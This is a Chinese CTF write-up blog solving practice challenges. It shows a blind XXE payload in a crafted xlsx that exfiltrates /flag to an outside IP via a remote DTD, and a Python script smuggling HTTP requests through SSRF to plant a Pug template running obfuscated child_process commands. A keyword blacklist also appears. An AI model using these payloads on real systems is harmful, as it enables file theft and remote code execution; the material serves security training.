<h1 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h1><p>考点：xxe无回显外带、CVE-2014-3529<br>参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/jxq0816/article/details/46775769">https://blog.csdn.net/jxq0816/article/details/46775769</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6996#toc-2">Apache-Poi-XXE-Analysis - 先知社区</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/122814159">https://blog.csdn.net/weixin_50464560&#x2F;article&#x2F;details&#x2F;122814159</a><br>上传文件的时候改一下文件名，带<code>/</code>就会报错，获取路径信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681058819867-5092ed0a-8f49-47a0-954a-3197a10536ea.png#averageHue=%23f4f2ef&clientId=u7a1f8a41-5edc-4&from=paste&height=104&id=u481b4795&name=image.png&originHeight=130&originWidth=639&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11068&status=done&style=none&taskId=uf72dbe30-e690-4de7-9fe7-a76b815bd10&title=&width=511.2" alt="image.png"><br>接下来要做的就是任意文件读取了，这里是读取了web.xml文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681062390328-057c2f13-e0d0-45be-80e6-eedc20084b17.png#averageHue=%23f1f1f1&clientId=u7a1f8a41-5edc-4&from=paste&id=uf533564c&originHeight=403&originWidth=529&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ud1538350-c92b-4481-aa26-8729ee981c5&title="><br>War包位置一般如下，读取之后可以得到主要class文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681062439360-cd68f24d-200e-4d36-8e61-d1df14460b6d.png#averageHue=%23262925&clientId=u7a1f8a41-5edc-4&from=paste&height=487&id=ue165bd17&name=image.png&originHeight=609&originWidth=1246&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1109001&status=done&style=none&taskId=u6c75d5f7-6829-4f10-8edc-47dabceb3aa&title=&width=996.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681062430215-988a2246-54a6-4683-b2b4-3f711e8b394e.png#averageHue=%232b2d2a&clientId=u7a1f8a41-5edc-4&from=paste&height=725&id=u4a562cd5&name=image.png&originHeight=906&originWidth=1364&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1624794&status=done&style=none&taskId=u1aa677ec-8bd4-4192-bf50-71ec4408f9c&title=&width=1091.2" alt="image.png"><br>我在这发现了个铭感的东西，这东西是用来处理excel表格的，随之就检索了一下看看会发生啥，是存在XXE注入的，但是没有回显，因此需要外带<br>首先准备POC，先在win上创建一个正常xlsx文件，然后拖到linux，改后缀为zip<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681062505946-783060b5-6d32-4bbb-94e0-5eb3ef1b72a2.png#averageHue=%232d2c24&clientId=u7a1f8a41-5edc-4&from=paste&height=231&id=ubed3cd27&name=image.png&originHeight=289&originWidth=791&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=330660&status=done&style=none&taskId=ucd115308-7372-4197-a152-3e66d9ebc88&title=&width=632.8" alt="image.png"><br>然后直接unzip一手，会得到多个xml文件，我们需要修改的是<code>[Content_Types].xml</code>文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://114.116.119.253:8000/poc.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Types</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.openxmlformats.org/package/2006/content-types&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">Default</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-package.relationships+xml&quot;</span> <span class="attr">Extension</span>=<span class="string">&quot;rels&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Default</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/xml&quot;</span> <span class="attr">Extension</span>=<span class="string">&quot;xml&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Override</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-officedocument.extended-properties+xml&quot;</span> <span class="attr">PartName</span>=<span class="string">&quot;/docProps/app.xml&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Override</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-package.core-properties+xml&quot;</span> <span class="attr">PartName</span>=<span class="string">&quot;/docProps/core.xml&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Override</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml&quot;</span> <span class="attr">PartName</span>=<span class="string">&quot;/xl/sharedStrings.xml&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Override</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml&quot;</span> <span class="attr">PartName</span>=<span class="string">&quot;/xl/styles.xml&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Override</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml&quot;</span> <span class="attr">PartName</span>=<span class="string">&quot;/xl/workbook.xml&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">Override</span> <span class="attr">ContentType</span>=<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml&quot;</span> <span class="attr">PartName</span>=<span class="string">&quot;/xl/worksheets/sheet1.xml&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">Types</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后dtd内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://114.116.119.253:8888?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是经典无回显外带的组合拳（注意一下转义特殊字符)，flag位置在class文件中告诉了，就是根目录，由于过滤了不能直接读，XXE帮我们外带了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681062599518-abba69f7-a8a9-41f5-87af-554fdd0be64f.png#averageHue=%231e1c1a&clientId=u7a1f8a41-5edc-4&from=paste&height=114&id=ub57b5e4d&name=image.png&originHeight=143&originWidth=899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11888&status=done&style=none&taskId=u9532d472-88ee-4c38-9873-6edb3cfbef4&title=&width=719.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681062604389-d1b64f24-9dec-40be-a129-7bb087385fbb.png#averageHue=%230c0a09&clientId=u7a1f8a41-5edc-4&from=paste&height=187&id=u7e027d32&name=image.png&originHeight=234&originWidth=873&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16895&status=done&style=none&taskId=u3fa3bf24-05a4-4830-8c04-bb8c1cd2e37&title=&width=698.4" alt="image.png"><br>成功获取flag<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/32634994/1681627166302-b8e81fe4-508d-47b8-b9de-6d2dac585ef5.jpeg#averageHue=%23858c88&clientId=u62a70b49-a697-4&from=paste&height=512&id=ub4c14b56&name=2292797302_c29fd95e59616d66343b28b9ff14b929.jpg&originHeight=640&originWidth=640&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48139&status=done&style=none&taskId=u3be31ea1-09a9-49ee-9631-a5ae8185f7c&title=&width=512" alt="2292797302_c29fd95e59616d66343b28b9ff14b929.jpg"></p>
<h1 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h1><p>考点：TP6反序列化RCE<br>然后靶场也坏了。</p>
<h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><p>考点：Node8走私攻击，Pug模板规则</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">body=<span class="string">&#x27;&#x27;&#x27;------WebKitFormBoundaryO9LPoNAg9lWRUItA</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryO9LPoNAg9lWRUItA--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">more=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /anythingelse HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.<span class="built_in">format</span>(<span class="built_in">len</span>(body)+<span class="number">10</span>,body)+more</span><br><span class="line">payload = payload.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0xff&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.trust_env = <span class="literal">False</span></span><br><span class="line">session.get(<span class="string">&#x27;http://1e1f41d5-6909-4538-a4c1-be1020cc04a7.node4.buuoj.cn:81/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line"><span class="comment"># response = session.get(&#x27;http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg&#x27;)</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先放一个payload，这其实就是西湖论剑那个Node8走私，不做过多阐述，但是这个payload写的真好啊。。。<br>题目都没看就写了payload，题目如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">multer</span>(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).<span class="title function_">array</span>(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">morgan</span>(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/uploads&quot;</span>,express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/template&quot;</span>,express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.<span class="property">query</span>.<span class="property">action</span>?req.<span class="property">query</span>.<span class="property">action</span>:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || action.<span class="title function_">includes</span>(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.<span class="title function_">renderFile</span>(file);</span><br><span class="line">    res.<span class="title function_">send</span>(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.<span class="property">msg</span>=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">path</span>, <span class="keyword">function</span>(<span class="params">err, data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.<span class="property">msg</span> = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">mimetype</span> +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">originalname</span></span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.<span class="title function_">mkdirSync</span>(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.<span class="property">msg</span> = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    <span class="attr">msg</span>: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    <span class="attr">filename</span>: file_path + file_name</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.<span class="property">msg</span> = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/core&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = <span class="title function_">blacklist</span>(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url, <span class="keyword">function</span>(<span class="params">resp</span>) &#123;</span><br><span class="line">                    resp.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err.<span class="property">code</span> === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resps = chunk.<span class="title function_">toString</span>();</span><br><span class="line">                            res.<span class="title function_">send</span>(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(e.<span class="property">message</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(e.<span class="property">message</span>);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">blacklist</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.<span class="title function_">includes</span>(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一个上传，一个SSRF的地方，SSRF的地方就是我们触发走私的点，通过这个点让服务端自己上传一个恶意pub文件，因为题目只允许localhost访问上传点<br>然后就是pub模板规则<br>这个搜一下随便看看就好，在里面变量的声明和yaml文件格式很像，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">var</span> x =<span class="number">1</span></span><br><span class="line">- <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p>这样的话访问页面就会看到1，然后还有个小坑，就是假如你想执行命令，你是不可以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">return</span> <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
